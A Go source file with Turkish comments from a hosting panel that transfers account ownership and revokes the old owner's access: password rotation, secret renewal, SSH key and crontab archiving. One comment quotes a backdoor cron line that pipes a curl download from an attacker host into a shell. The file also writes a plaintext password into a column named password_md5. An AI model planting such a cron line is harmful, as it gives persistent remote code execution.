package toplu

// devir.go — SAHİPLİK DEVRİ: bir hosting hesabının sahibini değiştirmek.
//
// 🔴 ESKİ DAVRANIŞ (güvenlik açığı): devir "UPDATE domains SET reseller_id/
// customer_id" idi. Sahiplik etiketi değişiyor, ERİŞİM hiç değişmiyordu:
//
//   - FTP parolası aynı kalıyordu. Müşteri paneline giriş bu parolayla yapılır
//     (internal/musteri: ftp_accounts.username + password_md5) → eski sahip
//     devirden sonra da yeni sahibin sitesine tam yetkiyle giriyordu. Sistem
//     (SSH/SFTP) parolası da bununla eşitli.
//   - Elindeki müşteri JWT'si 24 saat daha geçerliydi (iptal mekanizması yoktu).
//   - Git webhook secret'ı değişmiyordu. Webhook ucu KİMLİK DOĞRULAMASIZ'dır
//     (secret URL'de), yani eski sahip kendi deposundan yeni sahibin
//     public_html'ine kod push'layabilirdi.
//   - authorized_keys duruyordu → SSH açıldığı an parolasız erişim.
//   - Offsite yedek hedefi eski sahibin sunucusunu gösteriyordu → yeni sahibin
//     dosyaları+DB dump'ı her gece eski sahibe akıyordu.
//   - GitHub PAT'ı devrolduğu için yeni sahip eski sahibin tüm depolarını
//     görebiliyordu.
//   - Hiçbir denetim kaydı yazılmıyordu; eski sahiplik hiçbir yerde saklanmadığı
//     için devir GERİ ALINAMAZ'dı.
//
// Devir artık tek bir yaşam-döngüsü işlemidir: sahiplik + kimlik rotasyonu +
// capability iptali + denetim. Adımların çoğu "best effort"tur (dosya sistemi,
// harici servis); sahiplik UPDATE'i ise transaction içindedir.

import (
	"context"
	"database/sql"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"girginospanel/internal/hesaplar"
	"girginospanel/internal/httpx"
	bayikilit "girginospanel/internal/kilit"
	"golang.org/x/sys/unix"
)

// devirSonuc: admin'e raporlanacak özet (yeni FTP parolası dahil — yoksa yeni
// sahip kendi hesabına giremez).
type devirSonuc struct {
	YeniFTPParola string
	Uyarilar      []string
	Kritik        bool // erişim gerçekten kesilemedi → çağıran devri BAŞARISIZ saymalı
}

// devret — bir domaini yeni sahibe geçirir ve eski sahibin TÜM erişim
// artefaktlarını geçersiz kılar.
func (h *Handlers) devret(ctx context.Context, did int64, alanAdi, sk string, resellerID, customerID *int64, aktorUID int64, aktorAd string) (*devirSonuc, error) {
	sonuc := &devirSonuc{}
	uyar := func(f string, a ...any) { sonuc.Uyarilar = append(sonuc.Uyarilar, fmt.Sprintf(f, a...)) }

	// Eski sahipleri devirden ÖNCE oku: denetim kaydı ve geri alma için tek kayıt.
	var eskiRID, eskiCID sql.NullInt64
	_ = h.DB.QueryRowContext(ctx, "SELECT reseller_id, customer_id FROM domains WHERE id=?", did).
		Scan(&eskiRID, &eskiCID)

	// Hedef bayi kapısı: kilit + durum. Kilit, paralel hosting oluşturma ile
	// kota yarışını önler (aynı kilit handlers.go/handlers_plan.go'da kullanılıyor).
	if resellerID != nil && *resellerID > 0 {
		bk := bayikilit.Bayi(*resellerID)
		bk.Lock()
		defer bk.Unlock()

		var durum string
		if err := h.DB.QueryRowContext(ctx,
			"SELECT status FROM users WHERE id=? AND role='reseller'", *resellerID).Scan(&durum); err != nil {
			return nil, fmt.Errorf("hedef bayi okunamadı: %w", err)
		}
		if durum != "active" {
			return nil, fmt.Errorf("hedef bayi askıya alınmış (%s) — devir yapılmadı", durum)
		}
		if err := h.bayiKotaKapisi(ctx, *resellerID, did); err != nil {
			return nil, err
		}
	}

	// Yeni parolayı transaction'dan ÖNCE üret: crypto/rand hatasında RandomParola
	// boş döner; boş parolayla devre devam etmek "AAAA" tipi tahmin edilebilir
	// veya boş kimlik bırakır. Üretemiyorsak devri hiç başlatma.
	yeniParola := hesaplar.RandomParola(20)
	if yeniParola == "" {
		return nil, fmt.Errorf("güvenli parola üretilemedi (crypto/rand) — devir iptal")
	}

	// ── 1) Sahiplik (transaction) ──────────────────────────────────────────
	// NOT: reseller_id şeması NOT NULL DEFAULT 0'dır (0 = ana hesap/admin);
	// customer_id ise NULL kabul eder. Eski kod ikisine de NULLIF(?,0)
	// uyguluyordu → "Ana hesap" hedefiyle her devir Error 1048 ile DÜŞÜYORDU
	// (STRICT_TRANS_TABLES). Artık her kolon kendi semantiğiyle yazılır.
	tx, err := h.DB.BeginTx(ctx, nil)
	if err != nil {
		return nil, err
	}
	defer func() { _ = tx.Rollback() }()

	if resellerID != nil {
		if _, err := tx.ExecContext(ctx, "UPDATE domains SET reseller_id=? WHERE id=?", *resellerID, did); err != nil {
			return nil, fmt.Errorf("sahiplik (bayi): %w", err)
		}
	}
	if customerID != nil {
		if _, err := tx.ExecContext(ctx, "UPDATE domains SET customer_id=NULLIF(?,0) WHERE id=?", *customerID, did); err != nil {
			return nil, fmt.Errorf("sahiplik (müşteri): %w", err)
		}
	}

	// ── 2) Müşteri oturumlarını düşür + FTP PAROLASINI ROTASYONA SOK ────────
	// İkisi de transaction içinde ve domain_id anahtarıyla: müşteri girişi
	// (ftp_accounts.username+password_md5) devirden sonra ESKİ parolayla
	// yapılamamalı. Eski kod parolayı WHERE username=? ile ayrı çağrıda
	// döndürüyor ve RowsAffected'a bakmıyordu → username desync'inde SESSİZCE
	// no-op olur, denetime "döndürüldü=true" yazılır, eski sahip girmeye devam
	// ederdi. Artık domain_id ile, transaction içinde, satır sayısı doğrulanarak.
	if _, err := tx.ExecContext(ctx,
		"UPDATE ftp_accounts SET token_gecersiz_ts=UNIX_TIMESTAMP()+1 WHERE domain_id=?", did); err != nil {
		return nil, fmt.Errorf("oturum düşürme: %w", err)
	}
	res, err := tx.ExecContext(ctx,
		"UPDATE ftp_accounts SET password_md5=? WHERE domain_id=?", yeniParola, did)
	if err != nil {
		return nil, fmt.Errorf("FTP parola rotasyonu: %w", err)
	}
	if n, _ := res.RowsAffected(); n == 0 {
		// Bu domain için FTP hesabı yok/eşleşmedi: erişim kesilemez, devri durdur.
		return nil, fmt.Errorf("FTP hesabı bulunamadı (domain_id=%d) — erişim kesilemez, devir iptal", did)
	}
	sonuc.YeniFTPParola = yeniParola

	// ── 3) Git webhook secret'ı yenile ─────────────────────────────────────
	// Kimlik doğrulamasız uç; eski secret elde kaldığı sürece kod push'lanabilir.
	if _, err := tx.ExecContext(ctx,
		"UPDATE git_repos SET webhook_secret=? WHERE domain_id=?", hesaplar.RandomParola(32), did); err != nil {
		uyar("git webhook secret yenilenemedi: %v", err)
	}

	// ── 4) Offsite yedek hedefini pasifleştir ──────────────────────────────
	// Silmiyoruz: yeni sahip neyin durduğunu görsün, ama kimlik bilgisi kalmasın.
	if _, err := tx.ExecContext(ctx,
		"UPDATE backup_destinations SET aktif=0, parola='' WHERE domain_id=?", did); err != nil {
		uyar("uzak yedek hedefi pasifleştirilemedi: %v", err)
	}

	// ── 5) GitHub bağlantısını (PAT) kopar ─────────────────────────────────
	if _, err := tx.ExecContext(ctx, "DELETE FROM github_connections WHERE domain_id=?", did); err != nil {
		uyar("github bağlantısı koparılamadı: %v", err)
	}

	// ── 6) Açık bildirimleri yeni sahibe taşı ──────────────────────────────
	// Kapanmış olanlar eski sahipte kalır (geçmiş onun dönemine ait).
	if resellerID != nil {
		if _, err := tx.ExecContext(ctx,
			"UPDATE cp_bildirim SET reseller_id=? WHERE domain_id=? AND okundu=0", *resellerID, did); err != nil {
			uyar("bildirimler taşınamadı: %v", err)
		}
	}

	if err := tx.Commit(); err != nil {
		return nil, fmt.Errorf("devir kaydedilemedi: %w", err)
	}

	// ── 7) SSH/SFTP sistem parolasını FTP ile eşitle ───────────────────────
	// FTP parolası (panel + FTP girişi) transaction'da GARANTİ değişti. Sistem
	// (SSH/SFTP) parolası chpasswd ile ftp_accounts'tan okunup eşitlenir — DB
	// dışı olduğu için commit sonrası. Başarısızlığı KRİTİK: eski sahip hâlâ
	// SSH/SFTP ile eski parolada girebilir.
	if err := hesaplar.SyncSSHPassword(h.DB, sk); err != nil {
		sonuc.Kritik = true
		uyar("KRİTİK: sistem (SSH/SFTP) parolası eşitlenemedi — eski parola SSH'ta çalışmaya devam edebilir: %v", err)
	}

	// ── 8) SSH authorized_keys arşivle + shell kapat ───────────────────────
	if err := h.sshAnahtarlariArsivle(sk); err != nil {
		uyar("authorized_keys arşivlenemedi: %v", err)
	}

	// ── 9) Tenant crontab'ını arşivle + BOŞALT ─────────────────────────────
	// Eski sahibin bıraktığı bir cron satırı ("* * * * * curl saldırgan|sh")
	// devirden sonra kiracı kullanıcısı olarak çalışmaya devam ederdi = kalıcı
	// arka kapı. Arşivliyoruz (yeni sahip meşru işleri geri yükleyebilsin) ama
	// BOŞALTIYORUZ — "erişimi tümden kes" ilkesi arşiv notundan önce gelir.
	if n, err := h.crontabArsivleVeBosalt(sk); err != nil {
		uyar("crontab boşaltılamadı (gözden geçirin): %v", err)
	} else if n > 0 {
		uyar("eski sahipten devralınan %d cron satırı ARŞİVLENDİ ve durduruldu (arşiv: %s/%s.crontab.*) — meşru olanları yeni sahip geri yükleyebilir", n, devirArsivKok, sk)
	}

	// ── 10) Denetim kaydı ──────────────────────────────────────────────────
	detay := fmt.Sprintf("bayi %s→%s, müşteri %s→%s, ftp parolası döndürüldü=%t",
		nullStr(eskiRID), ptrStr(resellerID), nullStr(eskiCID), ptrStr(customerID),
		sonuc.YeniFTPParola != "")
	httpx.DenetimSistem(h.DB, aktorUID, aktorAd, "hosting.sahip_devir", alanAdi, detay,
		httpx.DomainKapsam(h.DB, did), true)

	return sonuc, nil
}

// bayiKotaKapisi — hedef bayinin domain/disk kotası devri kaldırıyor mu?
// Kota sayacı yok, canlı sayım yapılır (kaynak: handlers.go resellerKotaKontrol).
func (h *Handlers) bayiKotaKapisi(ctx context.Context, rid, did int64) error {
	var maxDomain, maxDiskMB sql.NullInt64
	if err := h.DB.QueryRowContext(ctx,
		"SELECT max_domain, max_disk_mb FROM users WHERE id=?", rid).Scan(&maxDomain, &maxDiskMB); err != nil {
		return fmt.Errorf("bayi kotası okunamadı: %w", err)
	}
	if maxDomain.Valid && maxDomain.Int64 > 0 {
		var adet int64
		// Devredilen domain zaten bu bayideyse sayımı şişirmesin.
		_ = h.DB.QueryRowContext(ctx,
			"SELECT COUNT(*) FROM domains WHERE reseller_id=? AND id<>?", rid, did).Scan(&adet)
		if adet >= maxDomain.Int64 {
			return fmt.Errorf("hedef bayinin domain kotası dolu (%d/%d)", adet, maxDomain.Int64)
		}
	}
	if maxDiskMB.Valid && maxDiskMB.Int64 > 0 {
		// Fiili kullanım (domains.boyut_kb) — handlers.go resellerKotaKontrol ile aynı kaynak.
		var kullanilanKB, devredilenKB sql.NullInt64
		_ = h.DB.QueryRowContext(ctx,
			"SELECT COALESCE(SUM(boyut_kb),0) FROM domains WHERE reseller_id=? AND id<>?", rid, did).Scan(&kullanilanKB)
		_ = h.DB.QueryRowContext(ctx,
			"SELECT COALESCE(boyut_kb,0) FROM domains WHERE id=?", did).Scan(&devredilenKB)
		toplamMB := (kullanilanKB.Int64 + devredilenKB.Int64) / 1024
		if toplamMB > maxDiskMB.Int64 {
			return fmt.Errorf("hedef bayinin disk kotası yetmiyor (%d MB > %d MB)", toplamMB, maxDiskMB.Int64)
		}
	}
	return nil
}

const devirArsivKok = "/var/lib/girginospanel/devir"

// sshAnahtarlariArsivle — authorized_keys'i devir arşivine taşır ve shell'i
// kapatır. Eski sahibin bıraktığı public key, SSH yeniden açıldığı an parolasız
// erişim demektir; parola rotasyonu bunu KAPATMAZ.
func (h *Handlers) sshAnahtarlariArsivle(sk string) error {
	if !strings.HasPrefix(sk, "c_") {
		return fmt.Errorf("güvenlik: c_ prefiksli olmayan kullanıcı")
	}
	// SYMLINK-GUVENLI: /home/<sk> tenant'in sahipligindedir; tenant .ssh'i
	// /root/.ssh veya /etc'e symlink'e cevirip panelin (root) o link uzerinden
	// dosya truncate etmesini saglayabilirdi. homeAltiAc openat2
	// (RESOLVE_NO_SYMLINKS) ile yol boyunca hicbir bagi izlemez; biri symlink
	// ise ELOOP doner. Acik fd uzerinden okuyup Truncate ederiz (TOCTOU yok).
	f, err := homeAltiAc(sk, ".ssh/authorized_keys", unix.O_RDWR, 0)
	if err != nil {
		// Shell'i her halukarda kapat (dosya yoksa da, symlink saldirisi denenmis
		// olsa da eski sahip parolayla girememeli).
		_ = hesaplar.LockSSHPassword(sk)
		if os.IsNotExist(err) {
			return nil // authorized_keys yok — normal
		}
		return err // ELOOP (symlink) veya izin: OKUMADAN/TRUNCATE ETMEDEN cik
	}
	defer f.Close()
	veri, err := io.ReadAll(f)
	if err != nil {
		_ = hesaplar.LockSSHPassword(sk)
		return err
	}
	if len(veri) > 0 {
		if err := os.MkdirAll(devirArsivKok, 0700); err == nil {
			hedef := filepath.Join(devirArsivKok, sk+".authorized_keys."+time.Now().UTC().Format("20060102-150405"))
			_ = os.WriteFile(hedef, veri, 0600)
		}
		_ = f.Truncate(0) // acik fd uzerinden — yol yeniden cozulmez
	}
	// Shell'i kapat: yeni sahip bilincli olarak acsin.
	_ = hesaplar.LockSSHPassword(sk)
	return nil
}

// crontabArsivle — tenant crontab'ının kopyasını devir arşivine alır, satır
// sayısını döner. İçeriği SİLMEZ (meşru işler durmasın).
func (h *Handlers) crontabArsivleVeBosalt(sk string) (int, error) {
	if !strings.HasPrefix(sk, "c_") {
		return 0, fmt.Errorf("güvenlik: c_ prefiksli olmayan kullanıcı")
	}
	out, err := exec.Command("crontab", "-u", sk, "-l").CombinedOutput()
	if err != nil {
		if strings.Contains(strings.ToLower(string(out)), "no crontab") {
			return 0, nil // gerçekten boş — normal
		}
		return 0, fmt.Errorf("crontab okunamadı: %s", strings.TrimSpace(string(out)))
	}
	var satir int
	for _, l := range strings.Split(string(out), "\n") {
		l = strings.TrimSpace(l)
		if l != "" && !strings.HasPrefix(l, "#") {
			satir++
		}
	}
	if satir == 0 {
		return 0, nil
	}
	if err := os.MkdirAll(devirArsivKok, 0700); err != nil {
		return satir, err
	}
	hedef := filepath.Join(devirArsivKok, sk+".crontab."+time.Now().UTC().Format("20060102-150405"))
	_ = os.WriteFile(hedef, out, 0600)
	// BOSALT: eski sahibin cron satiri arka kapi olarak calismaya devam etmesin.
	if o, e := exec.Command("crontab", "-u", sk, "-r").CombinedOutput(); e != nil {
		return satir, fmt.Errorf("crontab bosaltilamadi: %s", strings.TrimSpace(string(o)))
	}
	return satir, nil
}

func nullStr(v sql.NullInt64) string {
	if !v.Valid || v.Int64 == 0 {
		return "ana hesap"
	}
	return fmt.Sprintf("#%d", v.Int64)
}

func ptrStr(v *int64) string {
	if v == nil {
		return "değişmedi"
	}
	if *v == 0 {
		return "ana hesap"
	}
	return fmt.Sprintf("#%d", *v)
}
